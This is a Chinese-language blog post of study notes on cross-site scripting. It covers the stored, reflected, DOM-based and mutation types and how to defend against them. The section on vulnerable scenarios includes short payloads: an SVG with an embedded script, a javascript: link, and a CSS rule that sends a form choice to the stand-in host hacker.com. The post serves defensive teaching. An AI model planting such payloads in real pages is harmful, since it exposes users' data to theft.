---
layout: Post
title: "XSS"
subtitle: "web安全笔记（一）"
date: 2022-02-18
useHeaderImage: true
headerImage: /img/in-post/network-security/xss.jpg
headerMask: rgba(40, 57, 101, .4)
lastUpdated: false
catalog: true
tags:
  - web安全
---

::: info
【第二届青训营-寒假前端场】课程 web 开发的安全之旅的扩展笔记
首发: [【第二届青训营-寒假前端场】- web 安全笔记（一）—— XSS](https://forum.juejin.cn/youthcamp/post/7065686880871776293?from=4)
:::

## XSS：Cross-Site Scripting

- _Meaning_\
   XSS 攻击，跨站脚本攻击(Cross-Site Scripting)，为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为 XSS。XSS 是一种常见的 web 安全漏洞，它允许攻击者将恶意代码植入到提供给其它用户使用的页面中。不同于大多数攻击(一般只涉及攻击者和受害者)，XSS 涉及到三方，即攻击者、客户端与 Web 应用。XSS 的攻击目标是为了盗取存储在客户端的 cookie 或者其他网站用于识别客户端身份的敏感信息。一旦获取到合法用户的信息后，攻击者甚至可以假冒合法用户与网站进行交互。
  > 本段引用于：[常见 web 攻击总结 - morethink - 博客园 (cnblogs.com)](https://www.cnblogs.com/morethink/p/8734103.html)
- XSS 主要利用了
  - web 网站盲目信任用户提交的内容
  - 没有将用户提交内容进行过滤/转义，直接转化成 DOM
- XSS 的一些特点
  - 难点：通常难以从 UI 上感知（暗地执行脚本）
  - 目的：窃取用户信息（cookie/token）
  - 形式：绘制 UI（e.g. 弹窗），诱骗用户进行点击或填写表单

## XSS 分类

### Stored XSS：存储型 XSS

- _Meaning_\
  主要出现在让用户输入数据，供其他浏览此页的用户进行查看的地方，包括留言、评论、博客日志和各类表单等。应用程序从数据库中查询数据，在页面中显示出来，攻击者在相关页面输入恶意的脚本数据后，用户浏览此类页面时就可能受到攻击。
- _Tips_
  - 恶意脚本存在数据库中
  - 访问页面 ——> 读数据 ——> 被攻击
  - 危害最大，对全部用户可见

### Reflect XSS：反射型 XSS

- _Meaning_\
  主要做法是将脚本代码加入 URL 地址的请求参数里，请求参数进入程序后在页面直接输出，用户点击类似的恶意链接就可能受到攻击。
- _Tips_
  - 不涉及数据库
  - 从 URL 上攻击

### DOM-based XSS：基于 DOM 的 XSS

- _Meaning_\
  是基于文档对象模型 Document Objeet Model，DOM)的一种漏洞。客户端的脚本程序可以通过 DOM 动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得 DOM 中的数据在本地执行，如果 DOM 中的数据没有经过严格确认，就会产生 DOM—based XSS 漏洞。
- _Tips_
  - 不需要服务器的参与
  - 恶意攻击的发起+执行，全在浏览器完成

### Mutation-based XSS：突变 XSS

- _Meaning_\
  不论是服务器端或客户端的 XSS 过滤器，都认定过滤后的 HTM 源代码应该与浏览器所渲染后的 HTML 代码保持一致，至少不会出现很大的出入。然而，如果用户所提供的富文本内容通过 Javascript 代码进属性后，一些意外的变化会使得这个认定不再成立：一串看似没有任何危害的 HTML 代码，将逃过 XSS 过滤器的检测，最终进入某个 DOM 节点中，浏览器的渲染引擎会将本来没有任何危害的 HTML 代码渲染成具有潜在危险的 XSS 攻击代码。 随后，该段攻击代码，可能会被 JS 代码中的其它一些流程输出到 DOM 中或是其它方式被再次渲染，从而导致 XSS 的执行。这种由于 HTML 内容进后发生意外变化（mutation，突变，来自遗传学的一个单词，大家都知道的基因突变，gene mutation），而最终导致 XS 的攻击流程，被称为突变 XSS（mXSs, Mutation based Cross-Site-Scripting）
  > mXSS 的概念来源于：[xss 漏洞学习小结，详不详细你说了算](https://blog.csdn.net/MSB_WLAQ/article/details/120671017)
- _Tips_
  - 独特优化：利用了浏览器渲染 DOM 的特性
  - 按浏览器进行攻击：不同浏览器，会有区别

### Reflected XSS 和 DOM-based XSS 的区别

![image.png](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/5e5ad102931844338074a571488820e6~tplv-k3u1fbpfcp-zoom-1.image)

- Reflected XSS 攻击中，服务器在返回 HTML 文档的时候，就已经包含了恶意的脚本。
- DOM-based XSS 攻击中，服务器在返回 HTML 文档的时候，是不包含恶意脚本的，恶意脚本是在其执行了非恶意脚本后，被注入到文档里的。

## 如何防御 XSS

### 防范 XSS 漏洞原则

1. 永远不信任用户所提交的内容
2. 不要将用户提交内容直接转换成 DOM
3. 实现 Session tokens（Session 标记）、CAPTCHA（验证码）系统或者 HTTP 引用头检查
4. Cookie 防盗
5. 确认接收的内容被妥善地规范化

### 常见防御 XSS 的方法

1. 基于特征的防御：过滤特殊字符\
   主要是将用户所提供的内容进行过滤，如过滤`<script>`标签。
2. 基于代码修改的防御
   1. 用户向服务器上提交的信息要对 URL 和附带的的 HTTP 头、POST 数据等进行查询，对不是规定格式、长度的内容进行过滤。
   2. 实现 Session 标记（session tokens）、CAPTCHA 系统或者 HTTP 引用头检查，以防功能被第三方网站所执行。
   3. 确认接收的的内容被妥善的规范化，仅包含最小的、安全的 Tag（没有 javascript），去掉任何对远程内容的引用（尤其是样式表和 javascript），使用 HTTP only 的 cookie。
3. 客户端分层防御策略
   > 来源：[XSS 攻击\_百度百科 (baidu.com)](https://baike.baidu.com/item/XSS%E6%94%BB%E5%87%BB/954065?fr=aladdin)

### 一些防御 XSS 的现成工具

- 前端
  - 主流框架默认防御 XSS
  - 安装插件 google-closure-library
- 服务端
  - DOMPurify (Node)

### 一些可能出现 XSS 的场景

1. string ——> DOM
   ```js
   new DOMParser();
   ```
2. 上传 svg
   ```html
   <svg>
     <script>
       alert('xss');
     </script>
   </svg>
   ```
3. Blob 动态生成 script
   ```js
   const blob = new Blob([script], { type: "text/javascript" });
   const url = new URL.createObjectURL(blob);
   const script = document.createElement("script");
   script.src = url;
   ```
4. 自定义跳转链接
   ```html
    <a href='javascript: alert('xss');'></a>
   ```
5. 自定义样式
   ```css
   input[type="radio"].income-gt10k:checked {
     background: url("https://hacker.com/?income=gt10k");
   }
   ```

## 小结

XSS 攻击，利用恶意脚本发起攻击。在 OWASP TOP10 中，威胁排行在 A3。

> [WEB 安全\_OWASP TOP10 威胁和策略 - 简书 (jianshu.com)](https://www.jianshu.com/p/a4d2ef5c8abc)
